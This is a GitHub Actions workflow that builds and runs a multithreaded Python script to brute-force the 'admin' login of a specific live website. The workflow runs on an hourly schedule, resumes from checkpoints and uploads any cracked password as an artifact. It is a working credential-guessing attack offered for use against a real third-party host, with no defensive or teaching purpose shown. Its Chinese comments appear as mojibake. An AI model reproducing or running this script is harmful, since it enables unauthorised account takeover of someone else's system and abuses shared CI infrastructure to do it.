name: Password Brute Force Complete

on:
  workflow_dispatch:  # å…è®¸æ‰‹åŠ¨è§¦å‘
  schedule:
    - cron: '0 */1 * * *'  # æ¯6å°æ—¶è¿è¡Œä¸€æ¬¡

jobs:
  brute-force:
    runs-on: ubuntu-latest
    timeout-minutes: 280  # æ¥è¿‘GitHubçš„6å°æ—¶é™åˆ¶
    
    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Set up Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.9'

    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install requests tqdm

    - name: Create brute force script
      run: |
        cat > brute_force.py << 'EOF'
        import random
        import string
        import requests
        import json
        import time
        import os
        import itertools
        from concurrent.futures import ThreadPoolExecutor, as_completed
        from tqdm import tqdm

        # æ‰€æœ‰å¯èƒ½çš„å­—ç¬¦é›†
        ALL_CHARS = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?/~`"

        # å¯†ç ç”Ÿæˆå™¨ - æŒ‰é•¿åº¦é¡ºåºç”Ÿæˆ
        def password_generator(min_length=6, max_length=10):
            for length in range(min_length, max_length + 1):
                print(f"å¼€å§‹ç”Ÿæˆé•¿åº¦ä¸º {length} çš„å¯†ç ...")
                total_combinations = len(ALL_CHARS) ** length
                print(f"é•¿åº¦ {length} çš„å¯†ç æ€»æ•°: {total_combinations:,}")
                
                # ä½¿ç”¨è¿­ä»£å™¨ç”Ÿæˆå¯†ç ï¼Œé¿å…å†…å­˜çˆ†ç‚¸
                for chars in itertools.product(ALL_CHARS, repeat=length):
                    yield ''.join(chars)

        # ä»æ£€æŸ¥ç‚¹æ¢å¤
        def get_checkpoint():
            if os.path.exists("checkpoint.txt"):
                with open("checkpoint.txt", "r") as f:
                    return f.read().strip()
            return None

        # ä¿å­˜æ£€æŸ¥ç‚¹
        def save_checkpoint(password):
            with open("checkpoint.txt", "w") as f:
                f.write(password)

        # å°è¯•ç™»å½•çš„å‡½æ•°
        def try_login(password, attempt, total_attempts):
            url = "https://zank666api.icu/proxy/api/back/back-user/login"
            
            headers = {
                "Host": "zank666api.icu",
                "Content-Type": "application/json;charset=utf-8",
                "Origin": "https://zank666api.icu",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Accept": "application/json, text/plain, */*",
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
                "Referer": "https://zank666api.icu/",
                "Accept-Language": "zh-CN,zh-Hans;q=0.9"
            }
            
            data = {
                "password": password,
                "userName": "admin"
            }

            try:
                # æ·»åŠ å»¶è¿Ÿï¼Œé¿å…è¯·æ±‚è¿‡äºé¢‘ç¹
                time.sleep(0.5)
                
                response = requests.post(url, headers=headers, data=json.dumps(data), timeout=15)
                
                # è®°å½•å°è¯•
                with open("attempt_log.txt", "a") as f:
                    f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {password} - {response.status_code}\n")

                # æˆåŠŸåˆ¤æ–­æ¡ä»¶
                if response.status_code == 200:
                    try:
                        response_data = response.json()
                        success_conditions = [
                            response_data.get("code") == 200,
                            "token" in str(response_data).lower(),
                            "success" in str(response_data).lower(),
                            "æˆåŠŸ" in str(response_data)
                        ]
                        if any(success_conditions):
                            print(f"âœ… ç™»å½•æˆåŠŸ! å¯†ç æ˜¯: {password}")
                            print(f"å“åº”å†…å®¹: {response.text}")
                            with open("password.txt", "w") as f:
                                f.write(password)
                            with open("success_log.txt", "a") as f:
                                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - æˆåŠŸå¯†ç : {password}\n")
                            return True, password
                    except json.JSONDecodeError:
                        if "æˆåŠŸ" in response.text or "token" in response.text.lower():
                            print(f"âœ… ç™»å½•æˆåŠŸ! å¯†ç æ˜¯: {password}")
                            with open("password.txt", "w") as f:
                                f.write(password)
                            return True, password
                
                if attempt % 100 == 0:
                    print(f"[{attempt}/{total_attempts}] å°è¯•å¯†ç : {password} | çŠ¶æ€ç : {response.status_code}")
                
                return False, None

            except requests.exceptions.RequestException as e:
                print(f"[{attempt}/{total_attempts}] è¯·æ±‚é”™è¯¯: {e}")
                with open("error_log.txt", "a") as f:
                    f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {password} - é”™è¯¯: {e}\n")
                return False, None

        # æ™ºèƒ½å¯†ç ç”Ÿæˆç­–ç•¥ï¼ˆé¿å…ç”Ÿæˆæ‰€æœ‰ç»„åˆï¼‰
        def smart_password_generator():
            # å…ˆå°è¯•å¸¸è§æ¨¡å¼
            common_patterns = [
                # çº¯æ•°å­—
                *[str(i).zfill(length) for length in range(6, 11) for i in range(10**length)],
                
                # å­—æ¯+æ•°å­—ç»„åˆ
                *['admin' + str(i).zfill(2) for i in range(100)],
                *['Admin' + str(i).zfill(2) for i in range(100)],
                *['password' + str(i).zfill(2) for i in range(100)],
                
                # å¸¸è§å•è¯+æ•°å­—
                *[word + str(i) for word in ['test', 'user', 'login', 'pass', 'secret'] for i in range(1000)],
                
                # ç‰¹æ®Šå­—ç¬¦ç»„åˆ
                *['!'*length for length in range(6, 11)],
                *['@'*length for length in range(6, 11)],
                *['#'*length for length in range(6, 11)],
            ]
            
            for pattern in common_patterns:
                if 6 <= len(pattern) <= 10:
                    yield pattern
            
            # ç„¶åæŒ‰é•¿åº¦é¡ºåºç”Ÿæˆæ‰€æœ‰ç»„åˆ
            for length in range(6, 11):
                print(f"å¼€å§‹ç”Ÿæˆé•¿åº¦ä¸º {length} çš„æ‰€æœ‰ç»„åˆ...")
                # ä½¿ç”¨æ›´é«˜æ•ˆçš„æ–¹å¼ç”Ÿæˆï¼Œé¿å…å†…å­˜é—®é¢˜
                for i in range(len(ALL_CHARS) ** length):
                    chars = []
                    n = i
                    for _ in range(length):
                        chars.append(ALL_CHARS[n % len(ALL_CHARS)])
                        n //= len(ALL_CHARS)
                    yield ''.join(chars)

        def main():
            print("å¼€å§‹å®Œæ•´å¯†ç ç©ºé—´çˆ†ç ´...")
            print(f"å­—ç¬¦é›†: {ALL_CHARS}")
            print(f"å­—ç¬¦é›†å¤§å°: {len(ALL_CHARS)}")
            print("=" * 60)
            
            # ä»æ£€æŸ¥ç‚¹æ¢å¤
            checkpoint = get_checkpoint()
            start_from_checkpoint = checkpoint is not None
            
            if start_from_checkpoint:
                print(f"ä»æ£€æŸ¥ç‚¹æ¢å¤: {checkpoint}")
            else:
                print("å¼€å§‹æ–°çš„çˆ†ç ´ä¼šè¯")
            
            # å¤šçº¿ç¨‹å¤„ç†
            max_workers = 8
            found = False
            correct_password = None
            attempt_count = 0
            
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {}
                password_gen = smart_password_generator()
                
                # è·³è¿‡å·²å°è¯•çš„å¯†ç 
                if start_from_checkpoint:
                    skipping = True
                    for password in password_gen:
                        if skipping:
                            if password == checkpoint:
                                skipping = False
                                print(f"æ‰¾åˆ°æ£€æŸ¥ç‚¹ï¼Œå¼€å§‹ä»ä¸‹ä¸€ä¸ªå¯†ç å°è¯•")
                            continue
                        break
                
                try:
                    with tqdm(desc="å°è¯•å¯†ç ", unit="pwd") as pbar:
                        while not found:
                            # æäº¤æ–°ä»»åŠ¡
                            while len(futures) < max_workers * 2 and not found:
                                try:
                                    password = next(password_gen)
                                    attempt_count += 1
                                    
                                    future = executor.submit(try_login, password, attempt_count, "many")
                                    futures[future] = (password, attempt_count)
                                    
                                    # æ¯1000æ¬¡ä¿å­˜æ£€æŸ¥ç‚¹
                                    if attempt_count % 1000 == 0:
                                        save_checkpoint(password)
                                        pbar.set_description(f"å°è¯•å¯†ç : {password[:10]}...")
                                        pbar.update(1000)
                                    
                                except StopIteration:
                                    print("æ‰€æœ‰å¯†ç ç»„åˆå·²å°è¯•å®Œæ¯•")
                                    break
                            
                            # æ£€æŸ¥å®Œæˆçš„ä»»åŠ¡
                            for future in list(futures.keys()):
                                if future.done():
                                    password, count = futures[future]
                                    del futures[future]
                                    
                                    try:
                                        success, result_password = future.result()
                                        if success:
                                            found = True
                                            correct_password = result_password
                                            break
                                    except Exception as e:
                                        print(f"ä»»åŠ¡å¼‚å¸¸: {e}")
                            
                            if not futures:  # æ‰€æœ‰ä»»åŠ¡éƒ½å®Œæˆäº†
                                break
                                
                            time.sleep(0.1)
                
                except KeyboardInterrupt:
                    print("ç”¨æˆ·ä¸­æ–­")
                finally:
                    # å–æ¶ˆæ‰€æœ‰æœªå®Œæˆçš„ä»»åŠ¡
                    for future in futures:
                        future.cancel()
            
            return found, correct_password

        if __name__ == "__main__":
            start_time = time.time()
            found, password = main()
            end_time = time.time()
            
            print("=" * 60)
            if found:
                print(f"ğŸ‰ çˆ†ç ´æˆåŠŸ! å¯†ç æ˜¯: {password}")
                print(f"æ€»è€—æ—¶: {end_time - start_time:.2f} ç§’")
            else:
                print("âŒ çˆ†ç ´å¤±è´¥ï¼Œæœªæ‰¾åˆ°æ­£ç¡®å¯†ç ")
                print(f"æ€»å°è¯•æ—¶é—´: {end_time - start_time:.2f} ç§’")
        EOF

    - name: Run brute force
      run: |
        # åˆ›å»ºå¿…è¦çš„æ—¥å¿—æ–‡ä»¶
        touch attempt_log.txt error_log.txt
        # è¿è¡Œçˆ†ç ´è„šæœ¬
        timeout 275m python brute_force.py || echo "è¿è¡Œè¶…æ—¶æˆ–ä¸­æ–­"

    - name: Check if password found
      id: check_password
      run: |
        if [ -f "password.txt" ]; then
          echo "PASSWORD_FOUND=true" >> $GITHUB_OUTPUT
          echo "å¯†ç å·²æ‰¾åˆ°: $(cat password.txt)"
          echo "ğŸ‰ å¯†ç çˆ†ç ´æˆåŠŸ! å¯†ç : $(cat password.txt)" >> $GITHUB_STEP_SUMMARY
        else
          echo "PASSWORD_FOUND=false" >> $GITHUB_OUTPUT
          echo "æœ¬è½®æœªæ‰¾åˆ°å¯†ç "
          echo "ğŸ“Š æœ¬è½®è¿è¡Œå®Œæˆï¼Œç»§ç»­ä¸‹ä¸€è½®..." >> $GITHUB_STEP_SUMMARY
          # æ˜¾ç¤ºæ£€æŸ¥ç‚¹ä¿¡æ¯
          if [ -f "checkpoint.txt" ]; then
            echo "æ£€æŸ¥ç‚¹: $(cat checkpoint.txt)" >> $GITHUB_STEP_SUMMARY
          fi
        fi

    - name: Upload results
      uses: actions/upload-artifact@v4
      with:
        name: brute-force-results
        path: |
          password.txt
          success_log.txt
          attempt_log.txt
          error_log.txt
          checkpoint.txt
        if-no-files-found: ignore

    - name: Send summary
      run: |
        echo "è¿è¡Œå®Œæˆæ—¶é—´: $(date)" >> $GITHUB_STEP_SUMMARY
        if [ -f "attempt_log.txt" ]; then
          echo "å°è¯•æ¬¡æ•°: $(wc -l < attempt_log.txt)" >> $GITHUB_STEP_SUMMARY
        fi